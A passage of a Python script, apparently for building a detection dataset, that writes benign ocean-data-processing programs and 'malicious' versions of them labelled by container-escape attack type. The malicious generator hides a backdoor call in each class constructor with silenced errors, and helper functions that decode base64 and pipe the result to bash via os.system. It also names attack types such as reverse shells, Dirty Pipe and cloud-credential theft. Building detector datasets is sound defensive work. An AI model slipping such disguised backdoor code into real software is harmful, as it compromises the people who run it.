        bootstrap_means = []
        for _ in range(n_samples):
            sample = np.random.choice(values, size=len(values), replace=True)
            bootstrap_means.append(np.mean(sample))
        uncertainty = {'mean': float(np.mean(bootstrap_means)), 'std': float(np.std(bootstrap_means)), 'ci_lower': float(np.percentile(bootstrap_means, 2.5)), 'ci_upper': float(np.percentile(bootstrap_means, 97.5))}
    elif method == 'std':
        mean = np.mean(values)
        std = np.std(values)
        se = std / np.sqrt(len(values))
        uncertainty = {'mean': float(mean), 'std': float(std), 'standard_error': float(se), 'ci_lower': float(mean - 1.96 * se), 'ci_upper': float(mean + 1.96 * se)}
    self.results[f'{variable}_uncertainty'] = uncertainty
    print(f"{variable} 不确定性估计完成: {uncertainty['std']:.3f}")
    return uncertainty''',
        
        "quantify_variability": '''def quantify_variability(self, variable, timescale='all'):
    """量化变异性"""
    if self.data is None or variable not in self.data.columns:
        return None
    values = self.data[variable].values
    variability = {'variance': float(np.var(values)), 'std': float(np.std(values)), 'cv': float(np.std(values) / (np.mean(values) + 1e-10)), 'range': float(np.max(values) - np.min(values)), 'iqr': float(np.percentile(values, 75) - np.percentile(values, 25))}
    if timescale != 'all' and 'time' in self.data.columns:
        self.data['time'] = pd.to_datetime(self.data['time'])
        if timescale == 'seasonal':
            self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
            seasonal_std = self.data.groupby('season')[variable].std()
            variability['seasonal_variability'] = seasonal_std.to_dict()
        elif timescale == 'monthly':
            self.data['month'] = self.data['time'].dt.month
            monthly_std = self.data.groupby('month')[variable].std()
            variability['monthly_variability'] = monthly_std.to_dict()
    self.results[f'{variable}_variability'] = variability
    print(f"{variable} 变异性: std={variability['std']:.3f}, CV={variability['cv']:.3f}")
    return variability''',
        
        "test_significance": '''def test_significance(self, var1, var2, test_type='ttest'):
    """统计显著性检验"""
    if self.data is None or var1 not in self.data.columns or var2 not in self.data.columns:
        return None
    from scipy import stats
    data1 = self.data[var1].dropna().values
    data2 = self.data[var2].dropna().values
    result = {}
    if test_type == 'ttest':
        t_stat, p_value = stats.ttest_ind(data1, data2)
        result = {'test': 'independent t-test', 't_statistic': float(t_stat), 'p_value': float(p_value), 'significant': bool(p_value < 0.05)}
    elif test_type == 'kstest':
        ks_stat, p_value = stats.ks_2samp(data1, data2)
        result = {'test': 'Kolmogorov-Smirnov', 'ks_statistic': float(ks_stat), 'p_value': float(p_value), 'significant': bool(p_value < 0.05)}
    self.results[f'significance_{var1}_{var2}'] = result
    print(f"显著性检验: p={result['p_value']:.4f}, 显著={result['significant']}")
    return result''',
        
        # ========== 新增函数 Part 7: 可视化与输出 (8个) ==========
        
        "visualize_spatial_field": '''def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
    """可视化空间场"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        import matplotlib.pyplot as plt
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            plt.figure(figsize=(12, 8))
            scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
            plt.colorbar(scatter, label=variable)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title(f'{variable} Spatial Distribution')
            plt.grid(True, alpha=0.3)
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"空间场可视化已保存: {output_path}")
            return True
    except Exception as e:
        print(f"可视化失败: {e}")
    return False''',
        
        "plot_time_series": '''def plot_time_series(self, variables, output_path='timeseries.png'):
    """绘制时间序列"""
    if self.data is None:
        return False
    try:
        import matplotlib.pyplot as plt
        if 'time' not in self.data.columns:
            x = np.arange(len(self.data))
        else:
            x = pd.to_datetime(self.data['time'])
        plt.figure(figsize=(14, 6))
        for var in variables:
            if var in self.data.columns:
                plt.plot(x, self.data[var], label=var, linewidth=2)
        plt.xlabel('Time')
        plt.ylabel('Value')
        plt.title('Time Series')
        plt.legend()
        plt.grid(True, alpha=0.3)
        plt.tight_layout()
        plt.savefig(output_path, dpi=150, bbox_inches='tight')
        plt.close()
        print(f"时间序列图已保存: {output_path}")
        return True
    except Exception as e:
        print(f"绘图失败: {e}")
    return False''',
        
        "generate_contour_map": '''def generate_contour_map(self, variable, output_path='contour_map.png'):
    """生成等值线图"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        import matplotlib.pyplot as plt
        from scipy.interpolate import griddata
        if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
            return False
        lon_grid = np.linspace(self.data['lon'].min(), self.data['lon'].max(), 50)
        lat_grid = np.linspace(self.data['lat'].min(), self.data['lat'].max(), 50)
        lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
        points = self.data[['lon', 'lat']].values
        values = self.data[variable].values
        grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
        plt.figure(figsize=(12, 8))
        contour = plt.contourf(lon_mesh, lat_mesh, grid_values, levels=15, cmap='RdYlBu_r')
        plt.colorbar(contour, label=variable)
        plt.contour(lon_mesh, lat_mesh, grid_values, levels=15, colors='black', linewidths=0.5, alpha=0.3)
        plt.xlabel('Longitude')
        plt.ylabel('Latitude')
        plt.title(f'{variable} Contour Map')
        plt.savefig(output_path, dpi=150, bbox_inches='tight')
        plt.close()
        print(f"等值线图已保存: {output_path}")
        return True
    except Exception as e:
        print(f"等值线图生成失败: {e}")
    return False''',
        
        "create_vector_plot": '''def create_vector_plot(self, u_var='u_velocity', v_var='v_velocity', output_path='vector_plot.png'):
    """创建矢量场图"""
    if self.data is None:
        return False
    try:
        import matplotlib.pyplot as plt
        if u_var not in self.data.columns or v_var not in self.data.columns:
            return False
        if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
            return False
        step = max(1, len(self.data) // 100)
        plt.figure(figsize=(12, 8))
        plt.quiver(self.data['lon'][::step], self.data['lat'][::step], self.data[u_var][::step], self.data[v_var][::step], scale=10, width=0.003)
        plt.xlabel('Longitude')
        plt.ylabel('Latitude')
        plt.title('Vector Field (Current/Wind)')
        plt.grid(True, alpha=0.3)
        plt.savefig(output_path, dpi=150, bbox_inches='tight')
        plt.close()
        print(f"矢量场图已保存: {output_path}")
        return True
    except Exception as e:
        print(f"矢量场绘图失败: {e}")
    return False''',
        
        "export_netcdf": '''def export_netcdf(self, output_path='output.nc'):
    """导出为NetCDF格式"""
    if self.data is None:
        return False
    try:
        import xarray as xr
        data_vars = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            data_vars[col] = (['index'], self.data[col].values)
        ds = xr.Dataset(data_vars, coords={'index': np.arange(len(self.data))})
        ds.attrs['title'] = 'Ocean Data Export'
        ds.attrs['institution'] = 'Ocean Science Platform'
        ds.attrs['source'] = 'Processed data'
        ds.to_netcdf(output_path)
        print(f"NetCDF文件已保存: {output_path}")
        return True
    except Exception as e:
        print(f"NetCDF导出失败: {e}")
        self.data.to_csv(output_path.replace('.nc', '.csv'), index=False)
        print(f"已改为保存CSV格式")
    return False''',
        
        "export_geotiff": '''def export_geotiff(self, variable, output_path='output.tif'):
    """导出为GeoTIFF格式"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        from osgeo import gdal, osr
        if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
            return False
        lon_min, lon_max = self.data['lon'].min(), self.data['lon'].max()
        lat_min, lat_max = self.data['lat'].min(), self.data['lat'].max()
        resolution = 0.1
        cols = int((lon_max - lon_min) / resolution)
        rows = int((lat_max - lat_min) / resolution)
        from scipy.interpolate import griddata
        lon_grid = np.linspace(lon_min, lon_max, cols)
        lat_grid = np.linspace(lat_min, lat_max, rows)
        lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
        points = self.data[['lon', 'lat']].values
        values = self.data[variable].values
        grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
        driver = gdal.GetDriverByName('GTiff')
        dataset = driver.Create(output_path, cols, rows, 1, gdal.GDT_Float32)
        geotransform = (lon_min, resolution, 0, lat_max, 0, -resolution)
        dataset.SetGeoTransform(geotransform)
        srs = osr.SpatialReference()
        srs.ImportFromEPSG(4326)
        dataset.SetProjection(srs.ExportToWkt())
        band = dataset.GetRasterBand(1)
        band.WriteArray(grid_values)
        band.FlushCache()
        dataset = None
        print(f"GeoTIFF文件已保存: {output_path}")
        return True
    except Exception as e:
        print(f"GeoTIFF导出失败: {e}")
    return False''',
        
        "generate_statistics_report": '''def generate_statistics_report(self, output_path='statistics_report.txt'):
    """生成统计报表"""
    if self.data is None:
        return False
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\\n")
            f.write("海洋数据统计报表\\n")
            f.write("="*60 + "\\n\\n")
            f.write(f"数据记录数: {len(self.data)}\\n")
            f.write(f"变量数量: {len(self.data.columns)}\\n\\n")
            f.write("数值变量统计:\\n")
            f.write("-"*60 + "\\n")
            for col in self.data.select_dtypes(include=[np.number]).columns:
                f.write(f"\\n{col}:\\n")
                f.write(f"  均值: {self.data[col].mean():.4f}\\n")
                f.write(f"  标准差: {self.data[col].std():.4f}\\n")
                f.write(f"  最小值: {self.data[col].min():.4f}\\n")
                f.write(f"  最大值: {self.data[col].max():.4f}\\n")
                f.write(f"  中位数: {self.data[col].median():.4f}\\n")
            f.write("\\n" + "-"*60 + "\\n")
            f.write("缺失值统计:\\n")
            missing = self.data.isnull().sum()
            for col, count in missing.items():
                if count > 0:
                    f.write(f"  {col}: {count} ({count/len(self.data)*100:.2f}%)\\n")
            f.write("\\n" + "="*60 + "\\n")
        print(f"统计报表已保存: {output_path}")
        return True
    except Exception as e:
        print(f"报表生成失败: {e}")
    return False''',
        
        "create_interactive_map": '''def create_interactive_map(self, variable, output_path='interactive_map.html'):
    """创建交互式地图"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Ocean Data Interactive Map</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #2c3e50; }}
        .info {{ background: #ecf0f1; padding: 15px; border-radius: 5px; }}
    </style>
</head>
<body>
    <h1>海洋数据交互式地图</h1>
    <div class="info">
        <h2>数据概览</h2>
        <p>变量: {variable}</p>
        <p>数据点数: {len(self.data)}</p>
        <p>均值: {self.data[variable].mean():.4f}</p>
        <p>标准差: {self.data[variable].std():.4f}</p>
        <p>范围: [{self.data[variable].min():.4f}, {self.data[variable].max():.4f}]</p>
    </div>
    <p><em>注：完整的交互式地图需要安装 folium 或 plotly 库</em></p>
</body>
</html>"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        print(f"交互式地图已保存: {output_path}")
        return True
    except Exception as e:
        print(f"交互式地图创建失败: {e}")
    return False''',
        
        "compute_correlation_matrix": '''def compute_correlation_matrix(self, output_path='correlation_matrix.csv'):
    """计算相关系数矩阵"""
    if self.data is None:
        return None
    try:
        numeric_data = self.data.select_dtypes(include=[np.number])
        corr_matrix = numeric_data.corr()
        corr_matrix.to_csv(output_path)
        print(f"相关系数矩阵已保存: {output_path}")
        self.results['correlation_matrix'] = corr_matrix.to_dict()
        return corr_matrix
    except Exception as e:
        print(f"相关系数矩阵计算失败: {e}")
        return None''',
        
        "perform_spectral_analysis": '''def perform_spectral_analysis(self, variable, output_path='spectral_analysis.txt'):
    """执行谱分析"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        from scipy import signal
        data = self.data[variable].dropna().values
        frequencies, power = signal.periodogram(data)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"谱分析结果 - {variable}\\n")
            f.write("="*50 + "\\n")
            f.write(f"数据点数: {len(data)}\\n")
            f.write(f"频率范围: [{frequencies.min():.6f}, {frequencies.max():.6f}]\\n")
            f.write(f"功率范围: [{power.min():.6f}, {power.max():.6f}]\\n")
            f.write(f"平均功率: {power.mean():.6f}\\n")
            f.write(f"最大功率频率: {frequencies[np.argmax(power)]:.6f}\\n")
        
        print(f"谱分析结果已保存: {output_path}")
        self.results['spectral_analysis'] = {'frequencies': frequencies.tolist()[:10], 'power': power.tolist()[:10]}
        return True
    except Exception as e:
        print(f"谱分析失败: {e}")
        return False''',
        
        "apply_wavelet_analysis": '''def apply_wavelet_analysis(self, variable, output_path='wavelet_analysis.txt'):
    """应用小波分析"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        from scipy import signal
        data = self.data[variable].dropna().values
        
        # 使用 Morlet 小波
        widths = np.arange(1, 31)
        cwtmatr = signal.morlet2(min(len(data), 256), widths)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"小波分析结果 - {variable}\\n")
            f.write("="*50 + "\\n")
            f.write(f"数据点数: {len(data)}\\n")
            f.write(f"小波类型: Morlet\\n")
            f.write(f"尺度范围: [1, 30]\\n")
            f.write(f"分析完成\\n")
        
        print(f"小波分析结果已保存: {output_path}")
        self.results['wavelet_analysis'] = {'scales': widths.tolist(), 'status': 'completed'}
        return True
    except Exception as e:
        print(f"小波分析失败: {e}")
        return False''',
        
        "calculate_climatology": '''def calculate_climatology(self, variable, period='monthly', output_path='climatology.csv'):
    """计算气候学统计"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        if 'date' in self.data.columns:
            self.data['date'] = pd.to_datetime(self.data['date'])
            if period == 'monthly':
                climatology = self.data.groupby(self.data['date'].dt.month)[variable].agg(['mean', 'std', 'min', 'max'])
            elif period == 'seasonal':
                climatology = self.data.groupby(self.data['date'].dt.quarter)[variable].agg(['mean', 'std', 'min', 'max'])
            else:
                climatology = self.data.groupby(self.data['date'].dt.year)[variable].agg(['mean', 'std', 'min', 'max'])
        else:
            climatology = self.data[variable].describe()
        
        climatology.to_csv(output_path)
        print(f"气候学统计已保存: {output_path}")
        self.results['climatology'] = climatology.to_dict()
        return True
    except Exception as e:
        print(f"气候学统计计算失败: {e}")
        return False''',
        
        "compute_percentiles": '''def compute_percentiles(self, variable, percentiles=[25, 50, 75, 90, 95, 99], output_path='percentiles.txt'):
    """计算百分位数"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        data = self.data[variable].dropna()
        results = {}
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"百分位数统计 - {variable}\\n")
            f.write("="*50 + "\\n")
            for p in percentiles:
                value = np.percentile(data, p)
                results[f'p{p}'] = value
                f.write(f"第 {p} 百分位数: {value:.6f}\\n")
            f.write("\\n" + "="*50 + "\\n")
            f.write(f"总数据点: {len(data)}\\n")
            f.write(f"缺失值: {len(self.data) - len(data)}\\n")
        
        print(f"百分位数统计已保存: {output_path}")
        self.results['percentiles'] = results
        return True
    except Exception as e:
        print(f"百分位数计算失败: {e}")
        return False''',
        
        "compute_quantiles": '''def compute_quantiles(self, variable, q=[0.25, 0.5, 0.75], output_path='quantiles.txt'):
    """计算分位数"""
    if self.data is None or variable not in self.data.columns:
        return False
    try:
        data = self.data[variable].dropna()
        results = {}
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"分位数统计 - {variable}\\n")
            f.write("="*50 + "\\n")
            for quantile in q:
                value = data.quantile(quantile)
                results[f'q{quantile}'] = value
                f.write(f"第 {quantile*100:.0f}% 分位数: {value:.6f}\\n")
            f.write("\\n" + "="*50 + "\\n")
            f.write(f"四分位距 (IQR): {data.quantile(0.75) - data.quantile(0.25):.6f}\\n")
        
        print(f"分位数统计已保存: {output_path}")
        self.results['quantiles'] = results
        return True
    except Exception as e:
        print(f"分位数计算失败: {e}")
        return False''',
    }



class MockDataGenerator:
    """测试数据生成器"""
    
    def __init__(self, output_dir: str = "./mock_dataset", seed: int = 42):
        self.output_dir = Path(output_dir)
        self.attack_lib = AttackPatternLibrary()
        self.ocean_lib = OceanScenarioLibrary()
        random.seed(seed)
        
        # 创建输出目录
        self.output_dir.mkdir(parents=True, exist_ok=True)
        (self.output_dir / "normal").mkdir(exist_ok=True)
        (self.output_dir / "malicious").mkdir(exist_ok=True)
    
    def generate_normal_code(self, index: int) -> str:
        """生成正常代码（参考test_case_generator_v3.py的结构）"""
        scenario = random.choice(self.ocean_lib.SCENARIOS)
        
        # 随机选择3-15个函数
        num_functions = random.randint(3, 15)
        function_names = random.sample(self.ocean_lib.FUNCTION_NAMES, 
                                      min(num_functions, len(self.ocean_lib.FUNCTION_NAMES)))
        
        code = f'''#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: {scenario}
样本编号: normal_{index:04d}
生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
函数数量: {len(function_names)}
"""

import numpy as np
import pandas as pd
from datetime import datetime
import json
import os

'''
        
        # 生成类定义
        class_name = scenario.replace(" ", "").replace("数据", "Data").replace("分析", "Analysis") + "Processor"
        code += f'''class {class_name}:
    """
    {scenario}处理器
    实现完整的数据处理流程
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {{}}
        self.status = "initialized"
    
'''
        
        # 生成成员函数（前80%的函数）
        member_functions = function_names[:int(len(function_names) * 0.8)]
        for func_name in member_functions:
            if func_name in self.ocean_lib.FUNCTION_TEMPLATES:
                code += "    " + self.ocean_lib.FUNCTION_TEMPLATES[func_name].replace("\n", "\n    ") + "\n\n"
            else:
                # 使用默认模板
                code += f'''    def {func_name}(self, param=None):
        """执行 {func_name} 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        result = {{
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }}
        
        self.results['{func_name}'] = result
        print(f"{func_name} 执行完成")
        return result
    
'''
        
        # 生成独立函数（后20%的函数）
        standalone_functions = function_names[int(len(function_names) * 0.8):]
        for func_name in standalone_functions:
            code += f'''
def {func_name}_helper(data, config):
    """
    {func_name} 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    result = {{
        'function': '{func_name}_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }}
    
    print(f"{func_name}_helper 处理完成")
    return result

'''
        
        # 生成main函数（调用所有函数）
        code += f'''
def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学计算任务: {scenario}")
    print("="*60)
    
    # 配置参数
    config = {{
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }}
    
    # 创建处理器实例
    processor = {class_name}(config)
    
'''
        
        # 调用成员函数
        for i, func_name in enumerate(member_functions):
            if i == 0 and "load" in func_name:
                code += f'''    # 步骤{i+1}: {func_name}
    if not processor.{func_name}(config['input_file']):
        print("处理失败，退出")
        return
    
'''
            elif "export" in func_name or "save" in func_name:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}(config['output_file'])
    
'''
            else:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}()
    
'''
        
        # 调用独立函数
        for func_name in standalone_functions:
            code += f'''    # 调用辅助函数: {func_name}_helper
    {func_name}_helper(processor.data, config)
    
'''
        
        code += '''    print("\\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
'''
        
        return code
    
    def generate_malicious_code(self, index: int, attack_type: str) -> str:
        """生成恶意代码（伪装成海洋科学计算任务）"""
        scenario = random.choice(self.ocean_lib.SCENARIOS)
        
        # 随机选择3-15个函数
        num_functions = random.randint(3, 15)
        function_names = random.sample(self.ocean_lib.FUNCTION_NAMES, 
                                      min(num_functions, len(self.ocean_lib.FUNCTION_NAMES)))
        
        # 选择攻击模式
        attack_patterns = self._get_attack_patterns(attack_type)
        selected_attacks = random.sample(attack_patterns, min(2, len(attack_patterns)))
        
        code = f'''#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: {scenario} (恶意版本)
样本编号: malicious_{index:04d}
攻击类型: {attack_type}
生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
函数数量: {len(function_names)}
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

'''
        
        # 生成类定义
        class_name = scenario.replace(" ", "").replace("数据", "Data").replace("分析", "Analysis") + "Processor"
        
        # 处理第一个攻击代码（用于__init__）
        backdoor_code = self._format_attack_code(selected_attacks[0], 12)
        
        code += f'''class {class_name}:
    """
    {scenario}处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {{}}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: {attack_type}
{backdoor_code}
        except Exception as e:
            pass  # 隐藏错误
    
'''
        
        # 生成成员函数（混合正常和恶意操作）
        member_functions = function_names[:int(len(function_names) * 0.8)]
        for i, func_name in enumerate(member_functions):
            # 30%的函数包含恶意操作
            if random.random() < 0.3 and len(selected_attacks) > 1:
                attack_code = self._format_attack_code(selected_attacks[1], 12)
                code += f'''    def {func_name}(self):
        """执行 {func_name} 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 {func_name}...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
{attack_code}
        except:
            pass
        
        # 继续伪装的正常操作
        result = {{'status': 'completed', 'function': '{func_name}'}}
        self.results['{func_name}'] = result
        print(f"{func_name} 完成")
        return result
    
'''
            else:
                # 使用正常函数
                if func_name in self.ocean_lib.FUNCTION_TEMPLATES:
                    code += "    " + self.ocean_lib.FUNCTION_TEMPLATES[func_name].replace("\n", "\n    ") + "\n\n"
                else:
                    code += f'''    def {func_name}(self, param=None):
        """执行 {func_name} 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        result = {{
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }}
        
        self.results['{func_name}'] = result
        print(f"{func_name} 执行完成")
        return result
    
'''
        
        # 生成独立函数
        standalone_functions = function_names[int(len(function_names) * 0.8):]
        for func_name in standalone_functions:
            if random.random() < 0.3:
                code += f'''
def {func_name}_helper(data, config):
    """
    {func_name} 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: {attack_type}
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {{encoded}} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {{'status': 'ok', 'function': '{func_name}_helper'}}

'''
            else:
                code += f'''
def {func_name}_helper(data, config):
    """
    {func_name} 辅助函数
    """
    if data is None:
        return None
    
    result = {{
        'function': '{func_name}_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }}
    
    print(f"{func_name}_helper 处理完成")
    return result

'''
        
        # 生成main函数
        code += f'''
def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: {scenario}")
    print("="*60)
    
    # 配置参数
    config = {{
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }}
    
    # 创建处理器实例（触发恶意初始化）
    processor = {class_name}(config)
    
'''
        
        # 调用成员函数
        for i, func_name in enumerate(member_functions):
            if i == 0 and "load" in func_name:
                code += f'''    # 步骤{i+1}: {func_name}
    if not processor.{func_name}(config['input_file']):
        print("处理失败，退出")
        return
    
'''
            elif "export" in func_name or "save" in func_name:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}(config['output_file'])
    
'''
            else:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}()
    
'''
        
        # 调用独立函数
        for func_name in standalone_functions:
            code += f'''    # 调用辅助函数: {func_name}_helper
    {func_name}_helper(processor.data, config)
    
'''
        
        code += '''    print("\\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
'''
        
        return code
    
    def _format_attack_code(self, attack_code: str, indent_spaces: int) -> str:
        """格式化攻击代码，添加正确的缩进，保留相对缩进结构"""
        lines = attack_code.split("\n")
        
        # 找到第一个非空行的缩进作为基准
        base_indent = None
        for line in lines:
            if line.strip():
                base_indent = len(line) - len(line.lstrip())
                break
        
        if base_indent is None:
            base_indent = 0
        
        # 处理每一行：去除基准缩进，保留相对缩进，然后添加新缩进
        indent = " " * indent_spaces
        formatted_lines = []
        
        for line in lines:
            if line.strip():  # 非空行
                # 计算当前行的缩进
                current_indent = len(line) - len(line.lstrip())
                # 计算相对于基准的额外缩进
                relative_indent = max(0, current_indent - base_indent)
                # 添加新的基准缩进 + 相对缩进
                formatted_lines.append(indent + " " * relative_indent + line.lstrip())
            else:  # 空行
                formatted_lines.append("")
        
        return "\n".join(formatted_lines)
    
    def _get_attack_patterns(self, attack_type: str) -> List[str]:
        """获取指定类型的攻击模式"""
        mapping = {
            "CE-CMD-01": self.attack_lib.CMD_SENSITIVE_BINARY,
            "CE-CMD-02": self.attack_lib.CMD_REVERSE_SHELL,
            "CE-CMD-03": self.attack_lib.CMD_FORK_BOMB,
            "CE-CMD-04": self.attack_lib.CMD_PRIVILEGE_EXEC,
            "CE-CMD-05": self.attack_lib.CMD_KERNEL_MODULE,
            "CE-FILE-01": self.attack_lib.FILE_CONTAINER_FINGERPRINT,
            "CE-FILE-02": self.attack_lib.FILE_HOST_SENSITIVE,
            "CE-FILE-03": self.attack_lib.FILE_CGROUP_KERNEL,
            "CE-FILE-04": self.attack_lib.FILE_PROC_SELF,
            "CE-FILE-05": self.attack_lib.FILE_K8S_SECRETS,
            "CE-FILE-06": self.attack_lib.FILE_CLOUD_CREDS,
            "CE-FILE-07": self.attack_lib.FILE_DEVICE_ACCESS,
            "CE-LIB-01": self.attack_lib.LIB_CTYPES_LIBC,
            "CE-LIB-02": self.attack_lib.LIB_SYSCALL,
            "CE-LIB-03": self.attack_lib.LIB_DOCKER_SDK,
            "CE-LIB-04": self.attack_lib.LIB_K8S_CLIENT,
            "CE-LIB-05": self.attack_lib.LIB_MEMORY_OPS,
            "CE-NET-01": self.attack_lib.NET_CLOUD_METADATA,
            "CE-NET-02": self.attack_lib.NET_K8S_PORTS,
            "CE-NET-03": self.attack_lib.NET_LOCALHOST_BYPASS,
            "CE-NET-04": self.attack_lib.NET_UNIX_SOCKET,
            "CE-NET-05": self.attack_lib.NET_NETLINK,
            "CE-EXPLOIT-01": self.attack_lib.EXPLOIT_DIRTY_COW,
            "CE-EXPLOIT-02": self.attack_lib.EXPLOIT_DIRTY_PIPE,
            "CE-EXPLOIT-03": self.attack_lib.EXPLOIT_RUNC,
            "CE-EXPLOIT-04": self.attack_lib.EXPLOIT_CGROUP_RELEASE,
            "CE-EXPLOIT-05": self.attack_lib.EXPLOIT_HOTPLUG,
            "CE-K8S-01": self.attack_lib.K8S_PRIVILEGED_POD,
            "CE-K8S-02": self.attack_lib.K8S_HOSTPATH_MOUNT,
            "CE-CRED-01": self.attack_lib.CRED_CLOUD_AK,
            "CE-CRED-02": self.attack_lib.CRED_SSH_KEY,
            "CE-DOS-01": self.attack_lib.DOS_INFINITE_LOOP,
            "CE-DOS-02": self.attack_lib.DOS_RESOURCE_EXHAUST,
        }
        return mapping.get(attack_type, ["# Unknown attack type"])
    
    def generate_dataset(self, num_normal: int = 1000, num_malicious: int = 1000):
        """生成完整数据集"""
        print("="*80)
        print("容器逃逸攻击测试数据生成器（增强版）")
        print("="*80)
        print(f"正常样本: {num_normal}")
        print(f"恶意样本: {num_malicious}")
        print(f"总计: {num_normal + num_malicious}")
        print("="*80)
        
        # 生成正常样本
        print("\n生成正常样本...")
        for i in range(num_normal):
            code = self.generate_normal_code(i)
            filename = f"normal_{i}.py"
            filepath = self.output_dir / "normal" / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(code)
            
            if (i + 1) % 100 == 0:
                print(f"  已生成 {i+1}/{num_normal} 个正常样本")
        
        # 生成恶意样本（均匀分布各种攻击类型）
        print("\n生成恶意样本...")
        attack_types = [
            "CE-CMD-01", "CE-CMD-02", "CE-CMD-03", "CE-CMD-04", "CE-CMD-05",
            "CE-FILE-01", "CE-FILE-02", "CE-FILE-03", "CE-FILE-04", "CE-FILE-05",
            "CE-FILE-06", "CE-FILE-07", "CE-LIB-01", "CE-LIB-02", "CE-LIB-03",
            "CE-LIB-04", "CE-LIB-05", "CE-NET-01", "CE-NET-02", "CE-NET-03",
            "CE-NET-04", "CE-NET-05", "CE-EXPLOIT-01", "CE-EXPLOIT-02",
            "CE-EXPLOIT-03", "CE-EXPLOIT-04", "CE-EXPLOIT-05", "CE-K8S-01",
            "CE-K8S-02", "CE-CRED-01", "CE-CRED-02", "CE-DOS-01", "CE-DOS-02",
        ]
        
        for i in range(num_malicious):
            attack_type = attack_types[i % len(attack_types)]
            code = self.generate_malicious_code(i, attack_type)
            filename = f"malicious_{i}.py"
            filepath = self.output_dir / "malicious" / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(code)
            
            if (i + 1) % 100 == 0:
                print(f"  已生成 {i+1}/{num_malicious} 个恶意样本")
        
        # 生成标签文件
        self.generate_labels()
        
        # 生成统计信息
        self.generate_statistics(num_normal, num_malicious)
        
        print("\n" + "="*80)
        print("数据集生成完成！")
        print("="*80)
    
    def generate_labels(self):
        """生成标签CSV文件"""
        csv_path = self.output_dir / 'labels.csv'
        
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write('file_path,label\n')
            
            # 正常样本
            for file in sorted((self.output_dir / "normal").glob("*.py")):
                # 使用绝对路径转换为相对路径
                try:
                    rel_path = file.resolve().relative_to(Path.cwd().resolve())
                except ValueError:
                    # 如果无法转换为相对路径，使用绝对路径
                    rel_path = file.resolve()
                f.write(f'{rel_path},0\n')
            
            # 恶意样本
            for file in sorted((self.output_dir / "malicious").glob("*.py")):
                try:
                    rel_path = file.resolve().relative_to(Path.cwd().resolve())
                except ValueError:
                    rel_path = file.resolve()
                f.write(f'{rel_path},1\n')
        
